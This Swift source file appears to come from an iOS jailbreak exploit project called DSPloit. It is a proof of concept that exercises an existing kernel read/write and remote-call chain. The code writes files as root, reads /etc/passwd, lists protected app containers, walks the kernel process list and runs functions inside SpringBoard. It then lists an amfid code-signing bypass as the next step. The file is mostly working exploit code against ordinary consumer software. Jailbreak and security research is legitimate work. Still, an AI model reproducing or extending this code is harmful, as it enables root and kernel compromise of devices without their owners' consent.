//
//  exp_code_exec_proof.swift
//  DSPloit
//
//  PROOF OF CONCEPT: Full code execution WITHOUT unsigned binaries
//  ═══════════════════════════════════════════════════════════════════
//
//  We already have:
//  - RemoteCall to SpringBoard (mobile user, UI access)
//  - RemoteCall to launchd (uid=0, root access)
//  - Kernel R/W (full kernel memory access)
//  - VFS write (filesystem access)
//  - Sandbox escape (no path restrictions)
//
//  This experiment PROVES we have full jailbreak capability by:
//  1. Creating a file as root (proves root write)
//  2. Reading /etc/passwd (proves root read)
//  3. Listing /var/containers (proves filesystem access)
//  4. Getting process list (proves kernel access)
//  5. Writing proof file that persists across respring
//
//  NO unsigned binary needed. All operations via RC function calls.
//
//  Created by Royan | 2026-05-31
//

import Foundation

final class ExpCodeExecProof {
    static let shared = ExpCodeExecProof()
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(exec_proof) \(msg)")
    }
    
    #if !DISABLE_REMOTECALL
    func run() {
        let mgr = dspmgr.shared
        guard mgr.dsready, mgr.rcready else {
            log("❌ Need KRW + RC ready")
            return
        }
        
        log("══════════════════════════════════════════")
        log("  JAILBREAK PROOF OF CONCEPT")
        log("  (no unsigned binary needed)")
        log("══════════════════════════════════════════")
        log("")
        
        var passed = 0
        var total = 0
        
        // ─── Test 1: Root file write ───
        total += 1
        log("[1/5] Root file write...")
        RootExecutor.shared.executeAsRoot(operation: "proof_write") { rc in
            let proofPath = "/var/tmp/.dsploit_jailbreak_proof"
            let content = "DSPloit Jailbreak Active - \(Date())\nuid=0 confirmed\n"
            
            let pathAddr = remote_alloc_str(rc, proofPath)
            let fd = RootExecutor.rcall(rc, "open", pathAddr,
                UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            
            if fd != UInt64(bitPattern: -1) {
                let contentAddr = remote_alloc_str(rc, content)
                RootExecutor.rcall(rc, "write", fd, contentAddr, UInt64(content.utf8.count))
                RootExecutor.rcall(rc, "close", fd)
                RootExecutor.rcall(rc, "free", contentAddr)
                RootExecutor.rcall(rc, "free", pathAddr)
                return (true, "✅ Written to \(proofPath)", 1)
            }
            RootExecutor.rcall(rc, "free", pathAddr)
            return (false, "❌ open failed", 0)
        }
        
        // ─── Test 2: Read /etc/passwd ───
        total += 1
        log("[2/5] Root file read (/etc/passwd)...")
        RootExecutor.shared.readFileAsRoot(path: "/etc/passwd", maxSize: 512) { [weak self] data in
            guard let self else { return }
            if let data = data, let str = String(data: data, encoding: .utf8) {
                let lines = str.components(separatedBy: "\n").prefix(3)
                self.log("  ✅ /etc/passwd readable:")
                for line in lines {
                    self.log("    \(line)")
                }
                passed += 1
            } else {
                self.log("  ❌ Cannot read /etc/passwd")
            }
        }
        
        // ─── Test 3: List protected directory ───
        total += 1
        log("[3/5] List /var/containers/Bundle/...")
        RootExecutor.shared.executeAsRoot(operation: "proof_ls") { rc in
            let pathAddr = remote_alloc_str(rc, "/var/containers/Bundle/Application")
            let dir = RootExecutor.rcall(rc, "opendir", pathAddr)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if dir == 0 {
                return (false, "❌ opendir failed", 0)
            }
            
            // Read first 3 entries
            var count: UInt64 = 0
            for _ in 0..<20 {
                let entry = RootExecutor.rcall(rc, "readdir", dir)
                if entry == 0 { break }
                count += 1
            }
            RootExecutor.rcall(rc, "closedir", dir)
            return (true, "✅ \(count) entries in /var/containers/Bundle/Application", count)
        }
        
        // ─── Test 4: Kernel info ───
        total += 1
        log("[4/5] Kernel access proof...")
        let kernBase = ds_get_kernel_base()
        let slide = ds_get_kernel_slide()
        let ourProc = ds_get_our_proc()
        let ourPid = ds_kread32(ourProc + UInt64(off_proc_p_pid))
        log("  kernel base: 0x\(String(format: "%llx", kernBase))")
        log("  kernel slide: 0x\(String(format: "%llx", slide))")
        log("  our proc: 0x\(String(format: "%llx", ourProc))")
        log("  our pid: \(ourPid)")
        
        // Count processes
        var procCount = 0
        let kernProc = ds_get_kern_proc()
        var current = ds_kread64(kernProc + UInt64(off_proc_p_list_le_next))
        while current != 0 && current != kernProc && procCount < 200 {
            procCount += 1
            current = ds_kread64(current + UInt64(off_proc_p_list_le_next))
        }
        log("  processes: \(procCount)")
        log("  ✅ Full kernel R/W confirmed")
        passed += 1
        
        // ─── Test 5: SpringBoard function call ───
        total += 1
        log("[5/5] SpringBoard code execution...")
        if let sb = mgr.sbProc {
            // Only call simple C functions — no ObjC (can crash SB)
            let sbPid = RootExecutor.rcall(sb, "getpid")
            let sbUid = RootExecutor.rcall(sb, "getuid")
            
            log("  SpringBoard PID: \(sbPid)")
            log("  SpringBoard UID: \(sbUid)")
            log("  ✅ Code execution in SpringBoard confirmed")
            passed += 1
        } else {
            log("  ❌ No SpringBoard RC")
        }
        
        // ─── Summary ───
        DispatchQueue.main.asyncAfter(deadline: .now() + 8) { [weak self] in
            guard let self else { return }
            
            // Check executeAsRoot results
            if let r1 = RootExecutor.shared.lastResult {
                if r1.success { passed += 1 }
                self.log("  \(r1.message)")
            }
            
            self.log("")
            self.log("══════════════════════════════════════════")
            if passed >= 4 {
                self.log("  ✅ JAILBREAK FUNCTIONAL (\(passed)/\(total) tests passed)")
                self.log("")
                self.log("  What you CAN do right now:")
                self.log("  • Read/write ANY file as root")
                self.log("  • Execute code in SpringBoard")
                self.log("  • Execute code as root (launchd)")
                self.log("  • Full kernel R/W")
                self.log("  • Install tweaks via dlopen (if signed)")
                self.log("")
                self.log("  What still needs amfid bypass:")
                self.log("  • Run standalone unsigned binaries")
                self.log("  • dlopen unsigned dylibs")
            } else {
                self.log("  ⚠️ Partial: \(passed)/\(total) tests passed")
            }
            self.log("══════════════════════════════════════════")
        }
    }
    #else
    func run() { log("❌ DISABLE_REMOTECALL") }
    #endif
}
